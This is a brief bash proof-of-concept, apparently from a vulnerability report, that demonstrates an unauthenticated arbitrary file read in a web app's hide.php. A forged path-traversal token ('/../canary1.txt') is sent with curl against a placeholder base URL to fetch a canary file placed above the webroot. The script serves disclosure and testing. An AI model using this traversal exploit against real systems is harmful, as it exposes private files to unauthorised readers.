#!/usr/bin/env bash
# EI2-01 - Unauthenticated arbitrary file read via forged hide.php token.
# 1) put a canary file one level above the webroot:  echo OUT-OF-ROOT-MARKER > ../canary1.txt
# 2) forge the token (harmless canary target):       php forge_token.php '/../canary1.txt'
# 3) fetch unauthenticated:

curl -i "<BASE_URL>/app/hide.php"                        # control: no key -> 404.png baseline
curl -i "<BASE_URL>/app/hide.php?key=<FORGED_TOKEN>"     # -> 200 + canary content (above webroot)
